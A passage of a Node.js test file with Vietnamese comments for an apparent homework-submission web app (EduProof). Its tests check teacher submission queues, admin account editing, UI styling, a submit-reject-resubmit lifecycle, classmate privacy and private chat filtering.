// 1. Kiểm tra renderTeacherSubmissions lọc chính xác chỉ các bài status === 'submitted'
assert.ok(
  js46.includes('const list = baseList.filter((s) => s.status === "submitted");'),
  "renderTeacherSubmissions phải lọc chỉ bài nộp có status === 'submitted' để đưa vào hàng chờ"
);

// 2. Kiểm thử logic mô phỏng: Bài bị từ chối (resubmit_requested) hoặc đã kiểm tra (graded) phải lập tức biến mất khỏi hàng chờ
function mockFilterTeacherQueue(submissionsList) {
  return submissionsList.filter((s) => s.status === "submitted");
}

const mockQueue = [
  { id: "sub_1", studentName: "Lan Anh", status: "submitted" },
  { id: "sub_2", studentName: "Hoàng Anh", status: "submitted" },
  { id: "sub_3", studentName: "Hoài Anh", status: "graded" },
  { id: "sub_4", studentName: "Ngọc Anh", status: "resubmit_requested" }
];

const pendingQueue = mockFilterTeacherQueue(mockQueue);
assert.strictEqual(pendingQueue.length, 2, "Hàng chờ chỉ còn lại đúng 2 bài đang chờ");
assert.ok(pendingQueue.every((s) => s.status === "submitted"), "Tất cả bài trong hàng chờ đều phải có status là submitted");
assert.ok(!pendingQueue.some((s) => s.id === "sub_4"), "Bài sub_4 đã bị từ chối ảnh phải lập tức biến mất khỏi hàng chờ");
assert.ok(!pendingQueue.some((s) => s.id === "sub_3"), "Bài sub_3 đã kiểm tra phải lập tức biến mất khỏi hàng chờ");

// 3. Kiểm tra thông điệp khi hàng chờ trống
assert.ok(
  js46.includes("Hàng chờ bài nộp trống!"),
  "app.js phải hiển thị giao diện thông báo trạng thái hàng chờ trống lịch sự, rõ ràng"
);

console.log("✅ 46. Kiểm thử Hàng chờ Bài nộp (Tự động rời hàng chờ khi Từ chối ảnh hoặc Đã kiểm tra): ĐẠT");

// 47. Test: Admin có thể chỉnh sửa thông tin tài khoản Giáo viên và Học sinh
const html47 = fs.readFileSync(path.join(__dirname, "index.html"), "utf8");
const js47 = fs.readFileSync(path.join(__dirname, "app.js"), "utf8");

// 1. Kiểm tra index.html có đầy đủ modal chỉnh sửa tài khoản và các trường nhập liệu tương ứng
assert.ok(
  html47.includes('id="adminEditUserModal"') &&
  html47.includes('id="adminEditUserName"') &&
  html47.includes('id="adminEditUserUsername"') &&
  html47.includes('id="adminEditUserPassword"') &&
  html47.includes('id="adminEditStudentFields"') &&
  html47.includes('id="adminEditTeacherFields"') &&
  html47.includes('id="adminEditUserEmail"'),
  "index.html phải có modal adminEditUserModal và các trường chỉnh sửa tài khoản cho cả GV và HS"
);

// 2. Kiểm tra app.js có các hàm điều khiển modal và nút chỉnh sửa trên cả bảng và thẻ di động
assert.ok(
  js47.includes("function openAdminEditUserModal(") &&
  js47.includes("function closeAdminEditUserModal(") &&
  js47.includes("function handleAdminEditUserSubmit("),
  "app.js phải cài đặt đầy đủ openAdminEditUserModal, closeAdminEditUserModal, handleAdminEditUserSubmit"
);

assert.ok(
  js47.includes("openAdminEditUserModal('${sanitizeText(t.id)}')") &&
  js47.includes("openAdminEditUserModal('${sanitizeText(s.id)}')"),
  "app.js phải gắn nút Sửa tài khoản trên danh sách Giáo viên và cây Học sinh của Admin"
);

// 3. Kiểm thử logic mô phỏng cập nhật tài khoản Giáo viên và Học sinh
const mockUsers47 = [
  { id: "admin_root", username: "admin", name: "Quản trị viên", role: "admin" },
  { id: "gv_01", username: "gv_mai", name: "Cô Mai", role: "teacher", subject: "Toán", class: "12A1" },
  { id: "gv_02", username: "gv_hung", name: "Thầy Hùng", role: "teacher", subject: "Lý", class: "12A2" },
  { id: "hs_01", username: "hs_nam", name: "Trần Nam", role: "student", class: "12A1", teacherId: "gv_01", email: "" }
];

const mockSubmissions47 = [
  { id: "sub_1", studentId: "hs_01", studentName: "Trần Nam", className: "12A1" }
];

function mockAdminUpdateUser(userId, updateData, userList, subList) {
  const target = userList.find((u) => u.id === userId);
  if (!target) throw new Error("User not found");

  // Kiểm tra trùng username
  if (updateData.username) {
    const isDup = userList.some((u) => u.id !== userId && u.username.toLowerCase() === updateData.username.toLowerCase());
    if (isDup) throw new Error("Username already exists");
    target.username = updateData.username;
  }

  if (updateData.name) target.name = updateData.name;
  if (updateData.password) target.password = updateData.password;
  if (updateData.email !== undefined) target.email = updateData.email;

  if (target.role === "teacher") {
    if (updateData.subject) target.subject = updateData.subject;
    if (updateData.class !== undefined) target.class = updateData.class;
  } else if (target.role === "student") {
    if (updateData.class) target.class = updateData.class;
    if (updateData.teacherId) target.teacherId = updateData.teacherId;

    // Đồng bộ tên và lớp học sinh trong các bài nộp đã có
    subList.forEach((s) => {
      if (s.studentId === target.id) {
        s.studentName = target.name;
        s.className = target.class;
      }
    });
  }

  return target;
}

// Case A: Chặn trùng username
assert.throws(() => {
  mockAdminUpdateUser("hs_01", { username: "gv_mai" }, mockUsers47, mockSubmissions47);
}, /Username already exists/);

// Case B: Chỉnh sửa tài khoản Giáo viên
mockAdminUpdateUser("gv_01", {
  name: "Cô Hoàng Thị Mai",
  username: "gv_mai_toan",
  password: "newpass_gv1",
  subject: "Toán Nâng Cao",
  email: "co.mai@eduproof.vn"
}, mockUsers47, mockSubmissions47);

const updatedTeacher = mockUsers47.find((u) => u.id === "gv_01");
assert.strictEqual(updatedTeacher.name, "Cô Hoàng Thị Mai");
assert.strictEqual(updatedTeacher.username, "gv_mai_toan");
assert.strictEqual(updatedTeacher.password, "newpass_gv1");
assert.strictEqual(updatedTeacher.subject, "Toán Nâng Cao");
assert.strictEqual(updatedTeacher.email, "co.mai@eduproof.vn");

// Case C: Chỉnh sửa tài khoản Học sinh (đổi tên, chuyển lớp, chuyển giáo viên quản lý)
mockAdminUpdateUser("hs_01", {
  name: "Trần Hải Nam",
  username: "hs_nam_pro",
  password: "hs_password_99",
  class: "12A2",
  teacherId: "gv_02",
  email: "nam.tran@gmail.com"
}, mockUsers47, mockSubmissions47);

const updatedStudent = mockUsers47.find((u) => u.id === "hs_01");
assert.strictEqual(updatedStudent.name, "Trần Hải Nam");
assert.strictEqual(updatedStudent.username, "hs_nam_pro");
assert.strictEqual(updatedStudent.class, "12A2");
assert.strictEqual(updatedStudent.teacherId, "gv_02");
assert.strictEqual(updatedStudent.email, "nam.tran@gmail.com");

// Kiểm tra bài nộp của học sinh được tự động đồng bộ tên và lớp mới
assert.strictEqual(mockSubmissions47[0].studentName, "Trần Hải Nam");
assert.strictEqual(mockSubmissions47[0].className, "12A2");

console.log("✅ 47. Kiểm thử Admin Quản trị & Chỉnh sửa Thông tin Tài khoản Giáo viên và Học sinh: ĐẠT");

// 48. Test: Khắc phục triệt để lỗi ô chọn đợt bài bị kéo giãn chiều dọc thành hình vuông khổng lồ
const css48 = fs.readFileSync(path.join(__dirname, "app.css"), "utf8");

// 1. Kiểm tra .campaign-select và .form-select được cố định chiều cao chuẩn 38px, không bị giãn dọc
assert.ok(
  css48.includes("height: 38px !important;") &&
  css48.includes("min-height: 38px !important;") &&
  css48.includes("max-height: 38px !important;"),
  "app.css phải cố định height, min-height, max-height 38px cho .campaign-select để chống giãn dọc trên mọi thiết bị"
);

// 2. Kiểm tra .campaign-select-wrap trên màn hình nhỏ được reset flex: none !important
assert.ok(
  css48.includes(".campaign-select-wrap") &&
  css48.includes("flex: none !important;"),
  "app.css phải triệt tiêu flex basis dọc trên màn hình di động cho .campaign-select-wrap"
);

console.log("✅ 48. Kiểm thử Cố định Chiều cao Chuẩn Ô chọn Đợt bài (Chống Giãn dọc Khổng lồ trên Mobile/PC): ĐẠT");

// 49. Test: Loại bỏ hoàn toàn cơ chế tự động reload/re-render web ngầm, chỉ giữ duy trì trạng thái khi người dùng tự F5
const js49 = fs.readFileSync(path.join(__dirname, "app.js"), "utf8");

// 1. Đảm bảo đã xóa bỏ listener realtime ngầm tự động kích hoạt reload/re-render
assert.ok(
  !js49.includes("function setupRealtimeListener") &&
  !js49.includes("setupRealtimeListener()") &&
  !js49.includes("realtimeDebounceTimer"),
  "app.js không được chứa listener realtime ngầm tự ý re-render/reload web"
);

// 2. Kiểm tra syncCloudData không tự ý gọi renderCurrentView() khi chạy nền (chỉ gọi khi người dùng bấm nút đồng bộ chủ động)
assert.ok(
  !js49.includes("renderCurrentView();\n\n    if (notify)"),
  "syncCloudData chạy nền không được gọi renderCurrentView() làm gián đoạn giao diện của người dùng"
);

// 3. Đảm bảo cơ chế lưu và khôi phục khi người dùng chủ động nhấn F5 vẫn hoạt động hoàn hảo
assert.ok(
  js49.includes("localStorage.getItem(DB_KEY_AUTH)") &&
  js49.includes("sessionStorage.getItem(DB_KEY_AUTH)"),
  "app.js phải bảo tồn phiên đăng nhập và vị trí tab khi người dùng chủ động F5"
);

console.log("✅ 49. Kiểm thử Loại bỏ Hoàn toàn Cơ chế Tự Động Reload Trang Web & Bảo tồn F5 Thủ công: ĐẠT");

// 50. Test: Hiệu ứng chuyển động mượt mà (Dynamic Animations & Micro-Interactions)
const css50 = fs.readFileSync(path.join(__dirname, "app.css"), "utf8");

// 1. Kiểm tra định nghĩa các keyframes chuyển động hiện đại
assert.ok(
  css50.includes("@keyframes fadeInUp") &&
  css50.includes("@keyframes modalPopIn") &&
  css50.includes("@keyframes gradientFlow") &&
  css50.includes("@keyframes pulseSoft"),
  "app.css phải định nghĩa các keyframes fadeInUp, modalPopIn, gradientFlow, pulseSoft"
);

// 2. Kiểm tra hiệu ứng áp dụng cho thẻ, thanh highlight dải màu, modal và nút bấm
assert.ok(
  css50.includes("animation: fadeInUp") &&
  css50.includes("animation: modalPopIn") &&
  css50.includes("animation: gradientFlow") &&
  css50.includes(".btn:active") &&
  css50.includes("transform: scale(0.97)"),
  "app.css phải gán hiệu ứng fade-in thẻ, pop-in modal, gradient flow và phản hồi xúc giác khi bấm nút"
);

// 3. Đảm bảo tuân thủ tiêu chuẩn Accessibility chống chóng mặt (prefers-reduced-motion)
assert.ok(
  css50.includes("@media (prefers-reduced-motion: reduce)"),
  "app.css phải hỗ trợ prefers-reduced-motion để bảo vệ trải nghiệm người dùng nhạy cảm với chuyển động"
);

console.log("✅ 50. Kiểm thử Hiệu ứng Chuyển động Mượt mà & Tương tác Xúc giác (Animations & Micro-Interactions): ĐẠT");

// --- TEST 51: Kiểm thử logic hiển thị trạng thái và nút bấm khi giáo viên đã từ chối ảnh ---
const appJs51 = fs.readFileSync(path.join(__dirname, "app.js"), "utf8");

// 1. Kiểm tra logic hiển thị trạng thái và nút bấm trong renderTeacherCampaignView
assert.ok(
  appJs51.includes('sub.status === "resubmit_requested" || sub.resubmitRequested) ? "Xem bài đã từ chối" : "Kiểm tra bài làm"') &&
  appJs51.includes('sub.status === "resubmit_requested" || sub.resubmitRequested) ? "Cần nộp lại" : "Chờ xem"') &&
  appJs51.includes('sub.status === "submitted" && !sub.resubmitRequested'),
  "renderTeacherCampaignView phải hiển thị 'Cần nộp lại', nút 'Xem bài đã từ chối' và ẩn nút 'Từ chối ảnh' khi bài nộp đã bị từ chối"
);

// 2. Kiểm tra logic hiển thị trong renderTeacherGradebook
assert.ok(
  appJs51.includes('sub.status === "resubmit_requested" || sub.resubmitRequested) ? "Xem bài đã từ chối" : "Kiểm tra bài"') &&
  appJs51.includes('⚠️ Cần nộp lại ảnh</strong>') &&
  appJs51.includes('⏳ Chờ xem</span>'),
  "renderTeacherGradebook phải hiển thị trạng thái 'Cần nộp lại ảnh' và nút 'Xem bài đã từ chối'"
);

// 3. Kiểm tra logic trong openGradingStudio
assert.ok(
  appJs51.includes('headerPrefix = (sub.status === "resubmit_requested" || sub.resubmitRequested)\n    ? "Xem bài đã từ chối ảnh:"') ||
  appJs51.includes('headerPrefix = (sub.status === "resubmit_requested" || sub.resubmitRequested)'),
  "openGradingStudio phải cập nhật tiêu đề thành 'Xem bài đã từ chối ảnh' và ẩn nút từ chối nếu bài đã bị từ chối trước đó"
);

console.log("✅ 51. Kiểm thử Chuẩn hóa Logic Trạng thái Từ chối ảnh & Nút thao tác Giáo viên: ĐẠT");

// --- TEST 52: Kiểm thử toàn diện khắc phục các phần bỏ qua (Storage cleanup, Cascade Submissions, User Sync, Error Fallbacks) ---
const appJs52 = fs.readFileSync(path.join(__dirname, "app.js"), "utf8");

// 1. Kiểm tra dọn dẹp Storage bucket 'proofs' khi xóa bài tập
assert.ok(
  appJs52.includes('sb.storage.from("proofs").remove(filePaths)'),
  "deleteAssignment phải quét và xóa triệt để tệp ảnh trong bucket proofs để tránh tệp mồ côi"
);

// 2. Kiểm tra xóa cascade bài nộp khi xóa tài khoản Giáo viên
assert.ok(
  appJs52.includes('sb.from("eduproof_submissions").delete().in("assignment_id", Array.from(teacherAsgIds))'),
  "deleteTeacherAccount phải xóa toàn bộ bài nộp của các bài tập trực thuộc giáo viên trên Supabase Cloud"
);

// 3. Kiểm tra đồng bộ currentUser và student_name khi Admin chỉnh sửa thông tin
assert.ok(
  appJs52.includes('currentUser = { ...user };') &&
  appJs52.includes('sb.from("eduproof_submissions")\n        .update({ student_name: name })'),
  "handleAdminEditUserSubmit phải đồng bộ currentUser và cập nhật tên học sinh trong bài nộp"
);

// 4. Kiểm tra cơ chế cứu hộ ảnh nén và xoay ảnh khi gặp lỗi nạp ảnh (img.onerror)
assert.ok(
  appJs52.includes('img.onerror = () => {\n    console.warn("Lỗi nạp ảnh nén, sử dụng ảnh gốc làm fallback");'),
  "compressImage phải có img.onerror để tự động fallback về ảnh gốc mà không làm treo tiến trình tải ảnh"
);

console.log("✅ 52. Kiểm thử Toàn diện Khắc phục các Điểm Bỏ qua (Dọn dẹp Storage, Cascade Delete, Session Sync & Fallbacks): ĐẠT");

// --- TEST 53: Kiểm thử Vòng đời Toàn diện Khép kín (End-to-End State Machine: Nộp -> Từ chối -> Nộp lại -> Xác nhận -> Xóa) ---
const mockTeacher53 = { id: "gv_53", name: "Cô Thảo", role: "teacher", class: "12A2" };
const mockStudent53 = { id: "hs_53", name: "Nguyễn Văn An", username: "hs_053", role: "student", teacherId: "gv_53", email: "an@gmail.com" };
const mockAsg53 = { id: "asg_53", teacherId: "gv_53", title: "Bài tập Số 53", subject: "Ngữ văn", deadline: new Date(Date.now() + 86400000).toISOString() };

// 1. Học sinh nộp bài lần đầu: status = 'submitted'
let sub53 = {
  id: "sub_53",
  assignmentId: "asg_53",
  studentId: "hs_53",
  studentName: "Nguyễn Văn An",
  submittedAt: new Date().toISOString(),
  status: "submitted",
  photos: [{ id: "p1", url: "https://cloud.com/p1.jpg" }],
  resubmitRequested: false,
  feedback: ""
};

// Hàng chờ: Bài mới nộp phải xuất hiện trong hàng chờ giáo viên
let queue53 = [sub53].filter((s) => s.status === "submitted");
assert.strictEqual(queue53.length, 1, "Bài vừa nộp phải có trong hàng chờ bài nộp của giáo viên");

// 2. Giáo viên từ chối ảnh: chuyển sang 'resubmit_requested'
sub53.status = "resubmit_requested";
sub53.resubmitRequested = true;
sub53.feedback = "Ảnh mờ góc phải, em chụp lại giúp cô!";
sub53.grade = null;

// Hàng chờ: Bài bị từ chối phải tự động biến mất khỏi hàng chờ
queue53 = [sub53].filter((s) => s.status === "submitted");
assert.strictEqual(queue53.length, 0, "Bài bị từ chối ảnh phải lập tức rời khỏi hàng chờ giáo viên");

// Trạng thái thẻ & nút bấm: Phải là 'Cần nộp lại' và 'Xem bài đã từ chối', KHÔNG còn nút 'Từ chối ảnh'
const statusLabel53 = sub53.status === "graded" ? "Đã làm" : ((sub53.status === "resubmit_requested" || sub53.resubmitRequested) ? "Cần nộp lại" : "Chờ xem");
const btnLabel53 = sub53.status === "graded" ? "Xem lại bài" : ((sub53.status === "resubmit_requested" || sub53.resubmitRequested) ? "Xem bài đã từ chối" : "Kiểm tra bài làm");
const canReject53 = sub53.status === "submitted" && !sub53.resubmitRequested;

assert.strictEqual(statusLabel53, "Cần nộp lại", "Dòng trạng thái phải là 'Cần nộp lại'");
assert.strictEqual(btnLabel53, "Xem bài đã từ chối", "Nút chính phải đổi thành 'Xem bài đã từ chối'");
assert.strictEqual(canReject53, false, "Không được hiển thị nút từ chối ảnh khi bài đã bị từ chối");

// 3. Học sinh xem bài: Thấy cảnh báo và nộp lại ảnh mới thay thế
const studentStatus53 = sub53.status === "resubmit_requested" ? "resubmit" : "submitted";
assert.strictEqual(studentStatus53, "resubmit", "Học sinh phải thấy trạng thái yêu cầu chụp nộp lại");

// Học sinh tải ảnh mới lên thay thế: status quay lại 'submitted'
sub53.photos = [{ id: "p2", url: "https://cloud.com/p2.jpg" }];
sub53.status = "submitted";
sub53.resubmitRequested = false;
sub53.submittedAt = new Date().toISOString();

// Hàng chờ: Bài vừa nộp lại phải tự động xuất hiện lại trong hàng chờ
queue53 = [sub53].filter((s) => s.status === "submitted");
assert.strictEqual(queue53.length, 1, "Bài sau khi nộp lại phải tự động quay lại hàng chờ giáo viên");

// 4. Giáo viên kiểm tra & xác nhận hoàn thành: status = 'graded'
sub53.status = "graded";
sub53.grade = 10;
sub53.feedback = "Bài làm rất tốt!";

// Kiểm tra chặn học sinh nộp đè bài khi đã được xác nhận hoàn thành
const canStudentResubmit53 = sub53.status !== "graded";
assert.strictEqual(canStudentResubmit53, false, "Học sinh không được phép nộp lại bài khi giáo viên đã chấm điểm/xác nhận");

console.log("✅ 53. Kiểm thử Vòng đời Toàn diện Khép kín (End-to-End State Machine Lifecycle): ĐẠT");

// --- TEST 54: Kiểm thử Hiển thị Ảnh Trực quan & Lớp Vẽ Chấm Bài (Grading Studio Visual Fix) ---
const html54 = fs.readFileSync(path.join(__dirname, "index.html"), "utf8");
const appJs54 = fs.readFileSync(path.join(__dirname, "app.js"), "utf8");
const css54 = fs.readFileSync(path.join(__dirname, "app.css"), "utf8");

// 1. Kiểm tra kiến trúc thẻ ảnh #gradingImage và #annotationCanvas lồng nhau
assert.ok(
  html54.includes('id="gradingImage"') &&
  html54.includes('id="annotationCanvas"') &&
  html54.includes('id="canvasStageWrapper"'),
  "index.html phải có thẻ img #gradingImage và canvas #annotationCanvas lồng trong wrapper"
);

// 2. Kiểm tra CSS lớp vẽ trong suốt trên nền ảnh thật
assert.ok(
  css54.includes("#annotationCanvas") &&
  css54.includes("background: transparent !important;"),
  "app.css phải đặt nền canvas trong suốt để thấy ảnh bài làm bên dưới"
);

// 3. Kiểm tra nạp ảnh bằng thẻ img và không dùng cloneNode làm mất DOM
assert.ok(
  appJs54.includes('function handleGradingImageError') &&
  appJs54.includes('gradingImg.src = photoUrl;') &&
  !appJs54.includes('newCanvas = canvas.cloneNode(true)'),
  "app.js phải nạp ảnh trực tiếp qua gradingImg, có cơ chế cứu hộ ảnh và không dùng cloneNode làm mất canvas"
);

console.log("✅ 54. Kiểm thử Hiển thị Ảnh Trực quan & Lớp Vẽ Chấm Bài (Grading Studio Visual Fix): ĐẠT");

// --- TEST 55: Kiểm thử Danh sách Bạn Cùng Lớp (Bảo mật Tên đăng nhập/Mật khẩu) & Phòng Chat Đồng bộ Cloud (Zero LocalStorage) ---
const html55 = fs.readFileSync(path.join(__dirname, "index.html"), "utf8");
const appJs55 = fs.readFileSync(path.join(__dirname, "app.js"), "utf8");
const sql55 = fs.readFileSync(path.join(__dirname, "schema.sql"), "utf8");

// 1. Kiểm tra cấu trúc thẻ điều hướng 3 tab trong Student View
assert.ok(
  html55.includes('id="studentMainTabs"') &&
  html55.includes('id="studentTabBtnAssignments"') &&
  html55.includes('id="studentTabBtnChat"') &&
  html55.includes('id="studentTabBtnClassmates"') &&
  html55.includes('id="studentAssignmentsTab"') &&
  html55.includes('id="studentChatTab"') &&
  html55.includes('id="studentClassmatesTab"'),
  "index.html phải có đủ thanh tab điều hướng học sinh: Bài tập, Phòng chat, Bạn cùng lớp"
);

// 2. Kiểm tra giao diện phòng chat và tìm kiếm bạn cùng lớp
assert.ok(
  html55.includes('id="chatMessagesBox"') &&
  html55.includes('id="chatMessageInput"') &&
  html55.includes('id="chatSendForm"') &&
  html55.includes('id="studentClassmatesGrid"') &&
  html55.includes('id="classmateSearchInput"'),
  "index.html phải chứa đủ khung chat tin nhắn, ô nhập tin nhắn và lưới danh sách bạn cùng lớp kèm ô tìm kiếm"
);

// 3. Kiểm tra CSDL schema.sql: Bảng eduproof_messages, RLS & Realtime
assert.ok(
  sql55.includes("CREATE TABLE IF NOT EXISTS eduproof_messages") &&
  sql55.includes("ALTER TABLE eduproof_messages ENABLE ROW LEVEL SECURITY;") &&
  sql55.includes('"Allow select messages"') &&
  sql55.includes('"Allow insert messages"') &&
  sql55.includes("tablename = 'eduproof_messages'"),
  "schema.sql phải định nghĩa bảng eduproof_messages, kích hoạt RLS và xuất bản Realtime"
);

// 4. Kiểm tra logic phòng chat: Đồng bộ Cloud và TUYỆT ĐỐI KHÔNG LƯU VÀO LOCALSTORAGE
assert.ok(
  appJs55.includes("function switchStudentTab") &&
  appJs55.includes("function loadChatMessages") &&
  appJs55.includes("function handleSendChatMessage") &&
  appJs55.includes("function startChatAutoSync") &&
  appJs55.includes("function stopChatAutoSync"),
  "app.js phải cung cấp đầy đủ hàm chuyển tab, tải tin nhắn đám mây, gửi tin nhắn và auto sync định kỳ"
);

// Kiểm tra bảo chứng không dùng localStorage cho tin nhắn chat
assert.ok(
  !appJs55.includes('localStorage.setItem("eduproof_messages"') &&
  !appJs55.includes('localStorage.setItem("eduproof_chat"') &&
  !appJs55.includes('localStorage.setItem("chat_messages"'),
  "app.js TUYỆT ĐỐI KHÔNG ĐƯỢC dùng localStorage để lưu trữ tin nhắn chat học sinh"
);

// 5. Kiểm thử Bảo mật Thông tin Học sinh: Khung hiển thị bạn cùng lớp chỉ xuất Họ tên, TUYỆT ĐỐI KHÔNG xuất Username hoặc Password
const sampleMockStudents = [
  { id: "hs_001", username: "super_secret_username_99", password: "raw_secret_password_88", name: "Nguyễn Lê Bảo An", class: "12A1", role: "student" },
  { id: "hs_002", username: "hs_private_user_44", password: "pwd_very_private_11", name: "Trần Minh Quân", class: "12A1", role: "student" }
];

// Mô phỏng hàm trích xuất HTML của card học sinh dựa trên code thực tế trong app.js
function mockRenderClassmateCard(st) {
  const nameParts = (st.name || "Học sinh").trim().split(" ");
  const initial = nameParts[nameParts.length - 1][0].toUpperCase();
  const className = st.class ? `Lớp ${st.class}` : "Chưa xếp lớp";
  return `
    <div class="classmate-card">
      <div class="classmate-avatar">${initial}</div>
      <div style="flex: 1; min-width: 0;">
        <span class="name">${st.name}</span>
        <span class="class">${className}</span>
      </div>
    </div>
  `;
}

const renderedCardsHtml = sampleMockStudents.map(mockRenderClassmateCard).join("");
assert.ok(renderedCardsHtml.includes("Nguyễn Lê Bảo An"), "Card phải hiển thị họ tên học sinh");
assert.ok(renderedCardsHtml.includes("Trần Minh Quân"), "Card phải hiển thị họ tên học sinh");
assert.ok(!renderedCardsHtml.includes("super_secret_username_99"), "BẢO MẬT: Card không được chứa tên đăng nhập");
assert.ok(!renderedCardsHtml.includes("raw_secret_password_88"), "BẢO MẬT: Card không được chứa mật khẩu");
assert.ok(!renderedCardsHtml.includes("hs_private_user_44"), "BẢO MẬT: Card không được chứa tên đăng nhập");
assert.ok(!renderedCardsHtml.includes("pwd_very_private_11"), "BẢO MẬT: Card không được chứa mật khẩu");

// Kiểm tra mã nguồn app.js không xuất st.username hay st.password trong renderStudentClassmates
const classmatesFnCode = appJs55.substring(
  appJs55.indexOf("function renderStudentClassmates"),
  appJs55.indexOf("function handleClassmateSearch")
);
assert.ok(!classmatesFnCode.includes("st.username"), "renderStudentClassmates không được đọc hay hiển thị st.username");
assert.ok(!classmatesFnCode.includes("st.password"), "renderStudentClassmates không được đọc hay hiển thị st.password");

console.log("✅ 55. Kiểm thử Danh sách Bạn Cùng Lớp (Bảo mật Tên đăng nhập/Mật khẩu) & Phòng Chat Đồng bộ Cloud (Zero LocalStorage): ĐẠT");

// --- TEST 56: Kiểm thử Sắp xếp Bài tập Mới nhất lên Đầu Hàng & Nhãn "✨ Bài mới nhất" cho Học sinh ---
const appJs56 = fs.readFileSync(path.join(__dirname, "app.js"), "utf8");

// 1. Kiểm tra định nghĩa hàm getAssignmentTime và thuật toán sắp xếp giảm dần theo thời gian tạo
assert.ok(
  appJs56.includes("function getAssignmentTime") &&
  appJs56.includes("getAssignmentTime(b) - getAssignmentTime(a)"),
  "app.js phải cung cấp hàm getAssignmentTime và sắp xếp mảng bài tập giảm dần theo thời gian"
);

// 2. Kiểm tra giao diện học sinh hiển thị bài mới nhất lên đầu tiên và có huy hiệu ✨ Bài mới nhất
assert.ok(
  appJs56.includes('const isNewest = idx === 0') &&
  appJs56.includes("✨ Bài mới nhất"),
  "renderStudentView phải gắn cờ isNewest cho bài ở vị trí đầu tiên (idx === 0) và hiển thị nhãn ✨ Bài mới nhất"
);

// 3. Kiểm thử logic sắp xếp mảng bài tập thực tế
function testGetAssignmentTime(asg) {
  if (!asg) return 0;
  if (asg.createdAt) {
    const t = new Date(asg.createdAt).getTime();
    if (!isNaN(t) && t > 0) return t;
  }
  if (asg.created_at) {
    const t = new Date(asg.created_at).getTime();
    if (!isNaN(t) && t > 0) return t;
  }
  if (asg.id && typeof asg.id === "string") {
    const match = asg.id.match(/\d{10,}/);
    if (match) {
      const num = parseInt(match[0], 10);
      if (!isNaN(num) && num > 1000000000) return num;
    }
  }
  return 0;
}

const mockList = [
  { id: "asg_old_01", title: "Bài tập tuần trước", createdAt: "2026-11-01T08:00:00Z" },
  { id: "asg_newest_99", title: "Bài tập mới vừa giao", createdAt: "2026-11-07T08:45:00Z" },
  { id: "asg_middle_50", title: "Bài tập 3 ngày trước", createdAt: "2026-11-04T12:00:00Z" }
];

const sortedList = mockList.slice().sort((a, b) => testGetAssignmentTime(b) - testGetAssignmentTime(a));
assert.strictEqual(sortedList[0].id, "asg_newest_99", "Bài tập mới nhất vừa giao phải đứng ở hàng đầu tiên (index 0)");
assert.strictEqual(sortedList[1].id, "asg_middle_50", "Bài tập cũ hơn phải đứng ở vị trí sau");
assert.strictEqual(sortedList[2].id, "asg_old_01", "Bài tập cũ nhất phải đứng ở cuối cùng");

console.log("✅ 56. Kiểm thử Sắp xếp Bài tập Mới nhất lên Đầu Hàng & Nhãn '✨ Bài mới nhất' cho Học sinh: ĐẠT");

// --- TEST 57: Kiểm thử Hiển thị Học sinh Dưới quyền GV Hiện tại & Nhắn tin Riêng tư 1-1 (Direct Messaging) ---
const appJs57 = fs.readFileSync(path.join(__dirname, "app.js"), "utf8");
const html57 = fs.readFileSync(path.join(__dirname, "index.html"), "utf8");
const sql57 = fs.readFileSync(path.join(__dirname, "schema.sql"), "utf8");

// 1. Kiểm tra escapeHtml alias an toàn và lọc học sinh theo giáo viên
assert.ok(
  appJs57.includes("const escapeHtml = sanitizeText") || appJs57.includes("function escapeHtml"),
  "app.js phải định nghĩa escapeHtml an toàn để không ném lỗi ReferenceError làm trắng danh sách học sinh"
);
assert.ok(
  appJs57.includes("myTeacherId") &&
  appJs57.includes("u.teacherId === myTeacherId"),
  "renderStudentClassmates phải lọc đúng học sinh trực thuộc giáo viên của học sinh hiện tại"
);

// 2. Kiểm tra tính năng nhắn tin riêng 1-1
assert.ok(
  appJs57.includes("function startDirectChat") &&
  appJs57.includes("function switchToGroupChat") &&
  appJs57.includes("function handleChatRecipientChange") &&
  appJs57.includes("currentChatRecipient"),
  "app.js phải cung cấp đầy đủ các hàm hỗ trợ nhắn tin riêng 1-1 giữa học sinh"
);
assert.ok(
  html57.includes('id="chatRecipientSelect"') &&
  html57.includes('id="chatHeaderIcon"') &&
  html57.includes('id="chatHeaderTitle"'),
  "index.html phải có ô chọn kênh nhắn tin riêng hoặc chung cả lớp"
);

// 3. Kiểm tra schema.sql có cột recipient_id và recipient_name
assert.ok(
  sql57.includes("recipient_id TEXT") &&
  sql57.includes("ALTER TABLE eduproof_messages ADD COLUMN IF NOT EXISTS recipient_id TEXT;"),
  "schema.sql phải hỗ trợ cột recipient_id và recipient_name cho bảng eduproof_messages"
);

// 4. Kiểm thử logic cô lập tin nhắn riêng: Chỉ người gửi và người nhận mới thấy tin nhắn
const mockChatMessages = [
  { id: "m1", sender_id: "hs_01", recipient_id: null, content: "Tin nhắn chung cả lớp" },
  { id: "m2", sender_id: "hs_01", recipient_id: "hs_02", content: "Tin nhắn riêng gửi bạn hs_02" },
  { id: "m3", sender_id: "hs_02", recipient_id: "hs_01", content: "Tin nhắn riêng trả lời bạn hs_01" },
  { id: "m4", sender_id: "hs_03", recipient_id: "hs_04", content: "Tin nhắn bí mật của bạn khác" }
];

// Mô phỏng học sinh hs_01 xem chat riêng với hs_02
const curUser = { id: "hs_01", name: "Học sinh 1" };
const targetRecipient = { id: "hs_02", name: "Học sinh 2" };

const privateThread = mockChatMessages.filter((msg) => {
  const fromMeToPeer = curUser && msg.sender_id === curUser.id && msg.recipient_id === targetRecipient.id;
  const fromPeerToMe = curUser && msg.sender_id === targetRecipient.id && msg.recipient_id === curUser.id;
  return fromMeToPeer || fromPeerToMe;
});

assert.strictEqual(privateThread.length, 2, "Luồng chat riêng chỉ được chứa tin nhắn giữa hs_01 và hs_02");
assert.ok(!privateThread.some((m) => m.content === "Tin nhắn chung cả lớp"), "Chat riêng không được lẫn tin chung");
assert.ok(!privateThread.some((m) => m.content === "Tin nhắn bí mật của bạn khác"), "BẢO MẬT: Không được thấy tin nhắn riêng của bạn khác");

// Mô phỏng xem phòng chat chung cả lớp
const groupThread = mockChatMessages.filter((msg) => !msg.recipient_id || msg.recipient_id === "all");
assert.strictEqual(groupThread.length, 1, "Phòng chat chung chỉ chứa tin nhắn chung cả lớp");
assert.strictEqual(groupThread[0].content, "Tin nhắn chung cả lớp");

console.log("✅ 57. Kiểm thử Hiển thị Học sinh Dưới quyền GV Hiện tại & Nhắn tin Riêng tư 1-1 (Direct Messaging): ĐẠT");

